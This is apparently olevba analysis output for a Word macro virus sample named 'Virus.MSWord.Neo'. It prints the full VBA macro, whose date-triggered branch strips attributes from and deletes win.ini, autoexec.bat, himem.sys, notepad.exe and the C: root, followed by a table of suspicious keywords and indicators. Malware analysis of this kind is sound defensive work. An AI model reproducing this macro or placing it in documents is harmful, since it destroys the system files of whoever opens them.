olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Neo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Neo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Form_Load()
form1.Hide
If Date$ > "07-04-2000" Then GoTo del Else
If Year(Now) > 1999 Then End
Else
Date$ = "05-30-1999"
End
del:
file1 = "c:\windows\win.ini"
file2 = "c:\autoexec.bat"
file3 = "c:\windows\himem.sys"
file4 = "c:\windows\notepad.exe"
file5 = "c:\"
On Error Resume Next
SetAttr file1, 0
SetAttr file2, 0
SetAttr file3, 0
SetAttr file4, 0
SetAttr file5, 0
Kill file1
Kill file2
Kill file3
Kill file4
Kill file5
End
'The Chaos Virus
'By: Neo
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

